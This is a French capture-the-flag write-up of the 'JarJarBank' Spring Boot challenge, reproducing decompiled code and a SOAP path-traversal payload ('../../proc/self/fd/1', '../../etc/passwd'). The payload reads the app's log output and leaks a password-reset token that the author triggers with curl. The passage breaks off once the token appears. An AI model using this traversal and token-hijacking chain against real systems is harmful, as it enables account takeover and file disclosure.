# JarJarBank

![Thumb](../resources/JarJarBank-thumb.png)

## Introduction

JarJarBank était un challenge web en deux parties, et donc deux flags. 
J'ai apprécié le format du challenge où une archive était donnée avec tous les éléments permettant de relancer facilement le projet en local grâce au docker-compose joint dans l'archive.

## Description

Jarjar Bink était le directeur de la Banque Galactique, une institution financière qui gérait les transactions et crédits entre les différentes planètes de la République.

Il était fier de son travail et de sa réputation de banquier honnête et compétent.

Mais un jour, il reçut un message urgent de son assistant, qui lui annonçait qu'un pirate informatique avait réussi à s'introduire dans le système de sécurité de la banque et à détourner des millions de crédits vers un compte anonyme. Jarjar Bink était sous le choc. Comment cela avait-il pu arriver ? Qui était ce pirate ? Et comment allait-il récupérer l'argent volé ?

Il décida de mener l'enquête lui-même, en utilisant ses contacts et ses ressources. Il découvrit bientôt que le pirate n'était autre que son ancien rival, le comte Dooku, un ancien Jedi qui avait rejoint le côté obscur de la Force et qui cherchait à financer la Confédération des Systèmes Indépendants, une organisation séparatiste qui menaçait la paix dans la galaxie.

    Votre mission jeune padawan est la suivante : auditer la JarJarBank, trouver les failles que le comte Dooku a pu exploiter afin que JarJar puisse les corriger et qu'il remette de l'ordre dans la banque intergalactique !


Une URL permettant d'accéder au site web était donnée : http://jarjarbank.chall.malicecyber.com/

Cinq fichiers étaient fournis dans l'archive, permettant de lancer l'application sur son environnement :
- JarJarBank-1.0.jar contenant les classes java et les libs nécessaires à l'application,
- le Dockerfile permettant de build l'image docker,
- le docker-compose.yml pour lancer le container correctement avec les variables d'environnement,
- le .env contenant les variables d'environnement pré-configurés, plus qu'à les modifier pour le local,
- un main.sh, entrypoint du Dockerfile.

-----

## Résolution

**État des lieux**  

La première chose à faire a été de faire un tour sur l'application web en réalisant qu'au final il n'était rien possible de faire sur celui-ci car il était en maintenance. Le site nous préconisait d'utiliser l'API pour accéder aux différents services.

![Welcome](../resources/JarJarBank-welcome.png)

On comprend ici qu'il va falloir décompiler le Jar de l'archive pour comprendre quelles sont les APIs disponibles.

Je fais un rapide tour des différents fichiers et je comprends à la lecture du Dockerfile que le second FLAG est dans un fichier à la racine du serveur: /flag.

```dockerfile
FROM openjdk:17-slim
WORKDIR /app

ARG DEBIAN_FRONTEND=noninteractive
ARG MYSQL_ROOT_PASSWORD
ARG MYSQL_DATABASE
ARG MYSQL_PASSWORD
ARG MYSQL_USER

COPY src/JarJarBank-1.0.jar .

# Init
RUN apt-get update && apt-get upgrade -y && \
    apt-get install -y debconf-utils gosu && \
    echo mariadb-server mysql-server/root_password password ${MYSQL_ROOT_PASSWORD} | debconf-set-selections && \
    echo mariadb-server mysql-server/root_password_again password ${MYSQL_ROOT_PASSWORD} | debconf-set-selections && \
    apt-get install -y mariadb-server && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* && \
    useradd -u 1000 -r -s /bin/false challenge && \
    mkdir transactions && \
    chmod o+r JarJarBank-1.0.jar;
    
# Setup flag
RUN echo "DGHACK{GRAB_THIS_SECOND_FLAG_ON_TARGET}" > /flag && chmod 444 /flag    

RUN service mariadb start && \
    sleep 3 && \
    mysql -uroot -p${MYSQL_ROOT_PASSWORD} -e "CREATE USER ${MYSQL_USER}@localhost IDENTIFIED BY '${MYSQL_PASSWORD}';CREATE DATABASE ${MYSQL_DATABASE};GRANT ALL privileges ON ${MYSQL_DATABASE}.* TO '${MYSQL_USER}'@localhost;"

COPY main.sh /app
ENTRYPOINT ["/app/main.sh"]
```

Le premier étant quant à lui charger en variable d'environnement au lancement du container docker, celui-ci était visible dans le fichier docker-compose.yml.

```yml
version: '3.5'
services:
  web:
    build:
      context: .
      args:
        - MYSQL_ROOT_PASSWORD=${MYSQL_ROOT_PASSWORD}
        - MYSQL_DATABASE=${DB_NAME}
        - MYSQL_USER=${MYSQL_USER}
        - MYSQL_PASSWORD=${MYSQL_PASSWORD}
    container_name: "JarJarBank"
    hostname: "JarJarBank"
    restart: on-failure
    ports:
      - "8080:8080"
    environment:
      - DB_NAME=${DB_NAME}
      - DB_HOST=${DB_HOST}
      - DB_USER=${MYSQL_USER}
      - DB_PASSWORD=${MYSQL_PASSWORD}
      - SPRING_PROFILES_ACTIVE=prod
      - ADMIN_EMAIL=${ADMIN_EMAIL}
      - ADMIN_PASSWORD=${ADMIN_PASSWORD}
      - SUPPORT_EMAIL=${SUPPORT_EMAIL}
      - SUPPORT_PASSWORD=${SUPPORT_PASSWORD}
      - CUSTOMER_EMAIL=${CUSTOMER_EMAIL}
      - CUSTOMER_PASSWORD=${CUSTOMER_PASSWORD}
      - JWT_KEY=${JWT_KEY}
      - FIRST_FLAG=${FIRST_FLAG}
```

Le main.sh permet de démarrer un service de base de données et le jar. On voit les traces pour rendre le remote debug possible sur le container, malheureusement je n'ai pas réussi à le configurer correctement en ayant qu'un Jar pour rendre le debug possible.

```sh
#!/bin/bash

echo '[+] Starting mariadb...'
service mariadb start

echo '[+] Starting bank application ... '
chmod 755 -R /proc/self/fd/*
# exec gosu challenge java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:8000 -jar bank-1.0.jar
exec gosu challenge java -jar JarJarBank-1.0.jar
```

Je passe alors à la décompilation du Jar pour rendre lisible le code java. Dans un premier temps, j'ai utilisé JADX pour décompiler le Jar mais à la vue de certaines erreurs du rendu, je me suis tourné vers IntelliJ et son décompilateur fernflower qui semblait mieux adapté.

L'application JarJarBank est une application Java réalisée avec le framework SpringBoot, la documentation nous sera très utile ici pour comprendre les différentes subtilités.

Premièrement, l'application est démarrée dans la classe annotée avec `@SpringBootApplication` et initalise trois utilisateurs en base de données.

```java
@SpringBootApplication
public class JarJarBank {
    @Autowired
    private Environment env;
    private static final Logger LOGGER = LoggerFactory.getLogger(JarJarBank.class);

    public JarJarBank() {
    }

    public static void main(String[] args) {
        SpringApplication.run(JarJarBank.class, args);
    }

    @Bean
    public CommandLineRunner commandLineRunner(AuthenticationService service) {
        return (args) -> {
            LOGGER.info("Creating JarJarBank users ...");
            RegisterRequest admin = RegisterRequest.builder().firstname("Admin").lastname("Admin").email(this.env.getProperty("ADMIN_EMAIL")).password(this.env.getProperty("ADMIN_PASSWORD")).role(UserRoles.ADMIN).build();
            service.register(admin);
            LOGGER.info(String.format("'%s' user created", admin.getEmail()));
            RegisterRequest support = RegisterRequest.builder().firstname("Support").lastname("User").email(this.env.getProperty("SUPPORT_EMAIL")).password(this.env.getProperty("SUPPORT_PASSWORD")).role(UserRoles.SUPPORT).build();
            service.register(support);
            LOGGER.info(String.format("'%s' user created", support.getEmail()));
            RegisterRequest customer = RegisterRequest.builder().firstname("Customer").lastname("User").email("DGHACKCustomerUser@dghack.fr").password(this.env.getProperty("CUSTOMER_PASSWORD")).role(UserRoles.CUSTOMER).build();
            service.register(customer);
            LOGGER.info(String.format("'%s' user created", customer));
        };
    }
}
```

La lecture de ce fichier nous apprend que l'utilisateur "Customer" est statique et que son email est `DGHACKCustomerUser@dghack.fr` !
En faisant un tour sur les autres fichiers on apprend que plusieurs API REST sont disponibles et accessibles :

- /api/v1/account
- /api/v1/auth
- /api/v1/flag
- /api/v1/management
- /api/v1/transaction
- /api/v1/user

et qu'un service SOAP est aussi accessible sur le endpoint `/service/` avec un payload `transactionRequest`.

En lisant le code du controller de l'API `/flag/`, on comprend que cet ici qu'on va pouvoir récupérer le premier flag à travers un appel GET sur `/api/v1/flag/getFirstFlag`` mais qu'il faut être authentifié.

```java
@RestController
@RequestMapping({"/api/v1/flag"})
public class FlagRestController {
    private static final Logger LOGGER = LoggerFactory.getLogger(FlagRestController.class);
    @Autowired
    private MessageSource messages;
    @Value("${application.firstFlag}")
    private String firstFlag;

    public FlagRestController() {
    }

    @GetMapping({"/getFirstFlag"})
    public ResponseEntity<?> getFirstFlag(HttpServletRequest request) {
        return new ResponseEntity(new MessageResponse(String.format(this.messages.getMessage("message.firstFlag", (Object[])null, request.getLocale()), this.firstFlag)), HttpStatus.OK);
    }
}
```

En interrogeant les différentes APIs, on se rend compte qu'elles sont quasiment toutes protégées et qu'il faut être authentifié, en revanche, le service SOAP est ouvert.
En effet, Spring Security est utilisé pour protéger les points d'entrée et on peut voir sa configuration dans la classe `MultiHttpSecurityConfig` de l'application, on y observe plusieurs filtres (j'ai explosé le one liner de la chain pour rendre la compréhension de la config plus simple).

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class MultiHttpSecurityConfig {
    private final AuthenticationProvider authenticationProvider;
    private final JwtAuthenticationEntryPoint authenticationEntryPoint;

    @Bean
    public SoapAuthenticationFilter soapAuthenticationFilter() {
        return new SoapAuthenticationFilter();
    }

    @Bean
    public JwtAuthenticationFilter jwtAuthFilter() {
        return new JwtAuthenticationFilter();
    }

    @Bean
    public MaintenanceFilter maintenanceFilter() {
        return new MaintenanceFilter();
    }

    @Bean
    MvcRequestMatcher.Builder mvc(HandlerMappingIntrospector introspector) {
        return new MvcRequestMatcher.Builder(introspector);
    }

    @Bean
    public SecurityFilterChain apiFilterChain(HttpSecurity http, MvcRequestMatcher.Builder mvc) throws Exception {
        ((HttpSecurity)((HttpSecurity)
        ((AuthorizeHttpRequestsConfigurer.AuthorizedUrl)
        ((AuthorizeHttpRequestsConfigurer.AuthorizedUrl)
        ((AuthorizeHttpRequestsConfigurer.AuthorizedUrl)
        ((AuthorizeHttpRequestsConfigurer.AuthorizedUrl)
        ((AuthorizeHttpRequestsConfigurer.AuthorizedUrl)
        ((AuthorizeHttpRequestsConfigurer.AuthorizedUrl)
        ((AuthorizeHttpRequestsConfigurer.AuthorizedUrl)
        ((AuthorizeHttpRequestsConfigurer.AuthorizedUrl)
        ((AuthorizeHttpRequestsConfigurer.AuthorizedUrl)
        ((AuthorizeHttpRequestsConfigurer.AuthorizedUrl)
        ((AuthorizeHttpRequestsConfigurer.AuthorizedUrl)
        ((AuthorizeHttpRequestsConfigurer.AuthorizedUrl)
        ((AuthorizeHttpRequestsConfigurer.AuthorizedUrl)
        ((AuthorizeHttpRequestsConfigurer.AuthorizedUrl)
        ((AuthorizeHttpRequestsConfigurer.AuthorizedUrl)
        ((AuthorizeHttpRequestsConfigurer.AuthorizedUrl)
        ((AuthorizeHttpRequestsConfigurer.AuthorizedUrl)
        ((HttpSecurity)((HttpSecurity)((HttpSecurity)http.cors().and()).csrf().disable()).exceptionHandling()
        .authenticationEntryPoint(this.authenticationEntryPoint).and()).authorizeHttpRequests()
        .requestMatchers(new RequestMatcher[]{
            new AntPathRequestMatcher("/*"), 
            new AntPathRequestMatcher("/resources/**"), 
            new AntPathRequestMatcher("/api/v1/auth/**"), 
            new AntPathRequestMatcher("/api/v1/user/resetPassword"), 
            new AntPathRequestMatcher("/api/v1/user/savePassword")})).permitAll()
        .requestMatchers(new RequestMatcher[]{
            AntPathRequestMatcher.antMatcher(HttpMethod.POST, "/api/v1/user/")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_CREATE.name(), Permission.SUPPORT_CREATE.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.DELETE, "/api/v1/user/")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_DELETE.name(), Permission.SUPPORT_DELETE.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.GET, "/api/v1/account/all")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_READ.name(), Permission.SUPPORT_READ.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.GET, "/api/v1/account/getUserByAccountId")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_READ.name(), Permission.SUPPORT_READ.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.POST, "/api/v1/account/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_CREATE.name(), Permission.SUPPORT_CREATE.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.DELETE, "/api/v1/account/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_DELETE.name(), Permission.SUPPORT_DELETE.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.GET, "/api/v1/transaction/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_READ.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.PUT, "/api/v1/transaction/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_READ.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.POST, "/api/v1/transaction/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_UPDATE.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.DELETE, "/api/v1/transaction/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_DELETE.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher("/api/v1/management/**")}))
            .hasAnyRole(new String[]{UserRoles.ADMIN.name(), UserRoles.SUPPORT.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.GET, "/api/v1/management/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_READ.name(), Permission.SUPPORT_READ.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.POST, "/api/v1/management/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_CREATE.name(), Permission.SUPPORT_CREATE.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.PUT, "/api/v1/management/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_UPDATE.name(), Permission.SUPPORT_UPDATE.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.DELETE, "/api/v1/management/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_DELETE.name(), Permission.SUPPORT_DELETE.name()}).anyRequest()).authenticated().and())
            .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS).and()).authenticationProvider(this.authenticationProvider)
            .addFilterBefore(this.maintenanceFilter(), UsernamePasswordAuthenticationFilter.class)
            .addFilterBefore(this.jwtAuthFilter(), UsernamePasswordAuthenticationFilter.class)
            .addFilterBefore(this.soapAuthenticationFilter(), UsernamePasswordAuthenticationFilter.class);
        return (SecurityFilterChain)http.build();
    }

    public MultiHttpSecurityConfig(final AuthenticationProvider authenticationProvider, final JwtAuthenticationEntryPoint authenticationEntryPoint) {
        this.authenticationProvider = authenticationProvider;
        this.authenticationEntryPoint = authenticationEntryPoint;
    }
}

```

Il faut comprendre ici que dès qu'un appel est réalisé, celui-ci va traverser les différentes couches de la SecurityFilterChain ci dessus.

- Le soapAuthentificationFilter(), qui permet d'authentifier l'appel en tant qu'utilisateur "SOAP" avec un role "SOAP". 
- Le jwtAuthFilter(), qui permet d'authentifer un utilisateur si l'appelant à utiliser un header "Authorization" avec un "Bearer" token.
- Le maintenanceFilter() qui permet de filtrer les appels qui ne commencent pas par `/api/`, `/service/`, `/resources/` et `/maintenance/` pour redirger vers `/maintenance/`.

Puis, l'appel est envoyé dans le reste de la chain-ci dessus. On voit qu'il estp ossible d'appeler ces APIs sans être authentifié :

```java
        .authenticationEntryPoint(this.authenticationEntryPoint).and()).authorizeHttpRequests()
        .requestMatchers(new RequestMatcher[]{
            new AntPathRequestMatcher("/*"), 
            new AntPathRequestMatcher("/resources/**"), 
            new AntPathRequestMatcher("/api/v1/auth/**"), 
            new AntPathRequestMatcher("/api/v1/user/resetPassword"), 
            new AntPathRequestMatcher("/api/v1/user/savePassword")})).permitAll()
```

Mais qu'il faut a minima être authentifié et avoir certains rôles dans certains cas pour les appels APIs suivants :

```java
        .requestMatchers(new RequestMatcher[]{
            AntPathRequestMatcher.antMatcher(HttpMethod.POST, "/api/v1/user/")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_CREATE.name(), Permission.SUPPORT_CREATE.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.DELETE, "/api/v1/user/")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_DELETE.name(), Permission.SUPPORT_DELETE.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.GET, "/api/v1/account/all")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_READ.name(), Permission.SUPPORT_READ.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.GET, "/api/v1/account/getUserByAccountId")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_READ.name(), Permission.SUPPORT_READ.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.POST, "/api/v1/account/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_CREATE.name(), Permission.SUPPORT_CREATE.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.DELETE, "/api/v1/account/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_DELETE.name(), Permission.SUPPORT_DELETE.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.GET, "/api/v1/transaction/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_READ.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.PUT, "/api/v1/transaction/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_READ.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.POST, "/api/v1/transaction/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_UPDATE.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.DELETE, "/api/v1/transaction/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_DELETE.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher("/api/v1/management/**")}))
            .hasAnyRole(new String[]{UserRoles.ADMIN.name(), UserRoles.SUPPORT.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.GET, "/api/v1/management/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_READ.name(), Permission.SUPPORT_READ.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.POST, "/api/v1/management/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_CREATE.name(), Permission.SUPPORT_CREATE.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.PUT, "/api/v1/management/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_UPDATE.name(), Permission.SUPPORT_UPDATE.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.DELETE, "/api/v1/management/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_DELETE.name(), Permission.SUPPORT_DELETE.name()}).anyRequest()).authenticated().and())
```

On remarque alors que trois APIs sont ouvertes : 

- `/api/v1/auth/authenticate`, pour s'authentifier,
- `/api/v1/user/resetPassword`, pour reset un password grâce à un email (tiens, tiens...),
- `/api/v1/user/savePassword`, pour changer le password à partir d'un token généré par le resetPassword.

En parcourant le service SOAP et la lecture de la classe `ManagementEndpoint` et `FileManager`, on comprend qu'il est possible de lire des fichiers dans le dossier `/app/transactions` (valeur de `${application.transactionFolder}`), seulement si ces fichiers terminent par un digit ou par un digit.[xml|json|pdf|docx|doc] à cause de la regex `(^.*\\d+$|^.*\\d+\\.(" + String.join("|", this.listAllowedExtensions) + ")$)` et que le nom du fichier est "sanitize" et "normalize" pour éviter d'injecter des caractères non souhaités (null bytes par exemple) `normalizedPath.replaceAll("[^a-zA-Z0-9/.]", "")`.

```java
@Endpoint
public class ManagementEndpoint {
    private static final String NAMESPACE_URI = "http://www.jarjarbank.dghack.fr/xml/";
    final ArrayList<String> listAllowedExtensions = new ArrayList(Arrays.asList("xml", "json", "pdf", "docx", "doc"));
    @Value("${application.transactionFolder}")
    private String transactionFolder;

    public ManagementEndpoint() {
    }

    @PayloadRoot(
        namespace = "http://www.jarjarbank.dghack.fr/xml/",
        localPart = "transactionRequest"
    )
    @ResponsePayload
    public TransactionResponse getTransactionFile(@RequestPayload TransactionRequest request) {
        FileManager fileManager = new FileManager(this.transactionFolder + request.getTransactionFile(), this.listAllowedExtensions);
        String transactionContent = fileManager.readFileContent();
        TransactionResponse response = new TransactionResponse();
        response.setTransactionData(transactionContent);
        return response;
    }
}
```

```java
public class FileManager {
    private final String fileName;
    private final ArrayList<String> listAllowedExtensions;

    public FileManager(String fileName, ArrayList<String> listAllowedExtensions) {
        this.fileName = fileName;
        this.listAllowedExtensions = listAllowedExtensions;
    }

    public FileManager(String fileName) {
        this.fileName = fileName;
        this.listAllowedExtensions = new ArrayList();
    }

    public String readFileContent() {
        StringBuilder contentBuilder = new StringBuilder();
        String sanitizedPath = sanitizeFileName(this.fileName);
        String fileContent;
        if (!this.validateFileExtension(sanitizedPath)) {
            fileContent = "File not allowed";
        } else {
            File f = new File(this.fileName);
            if (f.exists() && !f.isDirectory()) {
                try {
                    BufferedReader br = new BufferedReader(new FileReader(f));

                    try {
                        contentBuilder.append(br.readLine()).append("\n");
                    } catch (Throwable var9) {
                        try {
                            br.close();
                        } catch (Throwable var8) {
                            var9.addSuppressed(var8);
                        }

                        throw var9;
                    }

                    br.close();
                } catch (IOException var10) {
                    contentBuilder.append(var10);
                }

                fileContent = contentBuilder.toString();
            } else {
                fileContent = "File does not exist";
            }
        }

        return fileContent;
    }

    public void writeContentFile() {
    }

    private static String normalizePath(String fileName) {
        Path normalizedPath = Paths.get(fileName).normalize();
        return normalizedPath.toString();
    }

    private static String sanitizeFileName(String fileName) {
        String normalizedPath = normalizePath(fileName);
        return normalizedPath.replaceAll("[^a-zA-Z0-9/.]", "");
    }

    private boolean validateFileExtension(String fileName) {
        String regexFileCheck = "(^.*\\d+$|^.*\\d+\\.(" + String.join("|", this.listAllowedExtensions) + ")$)";
        Pattern fileExtnPtrn = Pattern.compile(regexFileCheck);
        Matcher m = fileExtnPtrn.matcher(fileName);
        return m.matches();
    }
}
```

En parcourant les autres fichiers, on se rend compte qu'il existe plusieurs failles dans l'application, notamment une injection SQL sur le service `/api/v1/account/getUserByAccountId` qui utilise une native query sans vérifier l'input utilisateur, mais celle-ci est protégée, il faut avoir les droits ADMIN_READ ou SUPPORT_READ :

```java
    public User findByAccountId(String accountId) {
        String hql = String.format("    select * from User inner join Account \n    on User.id = Account.user_id \n    where Account.account_id = %s \n", accountId);
        TypedQuery<User> query = (TypedQuery)this.entityManager.createNativeQuery(hql, User.class);
        return (User)query.getSingleResult();
    }
```

Cependant, j'ai compris très tard que c'était juste un leurre...


**First Step : Récupération du Flag 1**

On sait maintenant que le flag est caché sous `/api/v1/flag/getFirstFlag`, il va falloir être authentifié.
Oui, mais comment ? Seul, les APIs `/api/v1/auth/authenticate`, `/api/v1/user/resetPassword`, `/api/v1/user/savePassword` et le service SOAP sous `/service/` sont ouverts. 

Je comprends vite comment utiliser le service SOAP et qu'une LFI est possible mais seulement sur les fichiers respectant la regex (dernier char digit ou digit.[xml|json|pdf|docx|doc]).
Pour interroger le service, il faut communiquer en SOAP et avoir la bonne enveloppe qui est facilement reconstructible grâce au XSD présent dans le Jar.

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:tns="http://www.jarjarbank.dghack.fr/xml/"
           targetNamespace="http://www.jarjarbank.dghack.fr/xml/" elementFormDefault="qualified">

    <xs:element name="transactionRequest">
        <xs:complexType>
            <xs:sequence>
                <xs:element name="transactionFile" type="xs:string"/>
            </xs:sequence>
        </xs:complexType>
    </xs:element>

    <xs:element name="transactionResponse">
        <xs:complexType>
            <xs:sequence>
                <xs:element name="transactionData" type="xs:string"/>
            </xs:sequence>
        </xs:complexType>
    </xs:element>
</xs:schema>
```

Voici, l'enveloppe reconstituée avec un premier payload ("1") que j'enregistre dans un fichier `request.xml` part :

```xml
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
    <SOAP-ENV:Header/>
    <SOAP-ENV:Body>
        <ns3:transactionRequest xmlns:ns3="http://www.jarjarbank.dghack.fr/xml/">
            <transactionFile>1</transactionFile>
        </ns3:transactionRequest>
    </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

J'utilise curl pour effectuer l'appel : `curl -v --header "content-type: text/xml" -d @request.xml https://jarjarbank.chall.malicecyber.com/service/`, et voici le retour du service:

```xml
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
    <SOAP-ENV:Header/><SOAP-ENV:Body>
        <ns3:transactionResponse xmlns:ns3="http://www.jarjarbank.dghack.fr/xml/">
            <transactionData>File does not exist</transactionData>
        </ns3:transactionResponse>
    </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

En tentant d'autres payloads classiques de LFI "../../etc/passwd", le service nous renvoyait `File not allowed` car ils étaient rejetés par l'expression régulière.
On comprend qu'il va falloir trouver ou produire un fichier intéressant et étant accepté par l'expression régulière.

Je regarde le code des API du endpoint `/api/v1/user` et je m'aperçois qu'il est simple de demander un reset du password si on connait l'email d'un utilisateur.

```java
    @PostMapping({"/resetPassword"})
    public ResponseEntity<?> resetPassword(HttpServletRequest request, @RequestParam("email") @Valid String userEmail) {
        User user = this.userService.findByEmail(userEmail);
        if (user == null) {
            LOGGER.error(String.format("ERROR. No account associated to email '%s'", userEmail));
            return new ResponseEntity(new MessageResponse(this.messages.getMessage("message.noUserEmail", (Object[])null, request.getLocale())), HttpStatus.NOT_FOUND);
        } else if (!user.getRole().equals(UserRoles.ADMIN) && !user.getRole().equals(UserRoles.SUPPORT)) {
            String token = this.randomToken(32);
            this.userService.createPasswordResetTokenForUser(user, token);
            LOGGER.info(String.format("Reset password token '%s' created for user '%s'", token, user));
            return new ResponseEntity(new MessageResponse(this.messages.getMessage("message.resetPasswordEmail", (Object[])null, request.getLocale())), HttpStatus.CREATED);
        } else {
            LOGGER.info(String.format("Remote ip: '%s' tried to reset '%s' account password", request.getRemoteAddr(), user.getEmail()));
            return new ResponseEntity(new MessageResponse(this.messages.getMessage("message.userNoResetPassword", (Object[])null, request.getLocale())), HttpStatus.UNAUTHORIZED);
        }
    }

    @PostMapping({"/savePassword"})
    public ResponseEntity<?> savePassword(HttpServletRequest request, @RequestBody @Valid NewPasswordRequest newPasswordRequest) {
        String token = newPasswordRequest.getToken();
        String result = this.securityUserService.validatePasswordResetToken(token);
        if (result != null) {
            LOGGER.error(String.format("No valid password reset token found with token '%s'", token));
            return new ResponseEntity(new MessageResponse(this.messages.getMessage("auth.message." + result, (Object[])null, request.getLocale())), HttpStatus.NOT_FOUND);
        } else {
            Optional<User> user = this.userService.getUserByPasswordResetToken(token);
            if (user.isPresent()) {
                this.userService.changeUserPassword((User)user.get(), newPasswordRequest.getNewPassword());
                LOGGER.info(String.format("Successfully changed password for user '%s'", user.get()));
                return new ResponseEntity(new MessageResponse(this.messages.getMessage("message.resetPasswordSuc", (Object[])null, request.getLocale())), HttpStatus.OK);
            } else {
                LOGGER.error(String.format("No valid user found with token '%s'", token));
                return new ResponseEntity(new MessageResponse(this.messages.getMessage("auth.message.invalid", (Object[])null, request.getLocale())), HttpStatus.NOT_FOUND);
            }
        }
    }
```

Bingo ! Nous avons un utilisateur détecté plus tôt.
Un coup de `curl -X POST https://jarjarbank.chall.malicecyber.com/api/v1/user/resetPassword?email=DGHACKCustomerUser@dghack.fr`, pour voir le retour suivant `{"message":"You should receive a Password Reset Email shortly"}`. Super, et maintenant ?

En regardant de près le code, on voit que le token est affiché dans les logs `LOGGER.info(String.format("Reset password token '%s' created for user '%s'", token, user));`, mais impossible d'y avoir accès.

Après plusieurs longues tentatives infructueuses de craft/récupération/bruteforce de token, je me suis documenté sur les fichiers intéressants qui terminent par un digit sous un environnement unix.
Et là, le graal : /proc/self/fd/1 permet de lire la sortie standard du process en cours "self", et /proc/self/fd/2 la sortie d'erreur.

C'est parti, je craft mon enveloppe SOAP avec `../../proc/self/fd/1`.

```xml
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
    <SOAP-ENV:Header/>
    <SOAP-ENV:Body>
        <ns3:transactionRequest xmlns:ns3="http://www.jarjarbank.dghack.fr/xml/">
            <transactionFile>../../proc/self/fd/1</transactionFile>
        </ns3:transactionRequest>
    </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

1. J'envoie le `curl -v --header "content-type: text/xml" -d @request.xml https://jarjarbank.chall.malicecyber.com/service/`, curl attend un retour...
2. J'envoie la suite dans un autre terminal `curl -X POST https://jarjarbank.chall.malicecyber.com/api/v1/user/resetPassword?email=DGHACKCustomerUser@dghack.fr`.
Et voilà le retour de la première requête que curl attendait !

```xml
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"><SOAP-ENV:Header/><SOAP-ENV:Body><ns3:transactionResponse xmlns:ns3="http://www.jarjarbank.dghack.fr/xml/"><transactionData>2023-12-01T12:18:46.174Z  INFO 1 --- [nio-8080-exec-8] c.d.j.c.v1.api.UserRestController        : Reset password token 'MvD1VUC8fxn6F4IPlomMq3Ud1EHrfEXJ' created for user 'User {id=3, email='DGHACKCustomerUser@dghack.fr', firstName='Customer', lastName='User', mobileNumber='null', roles=CUSTOMER}'
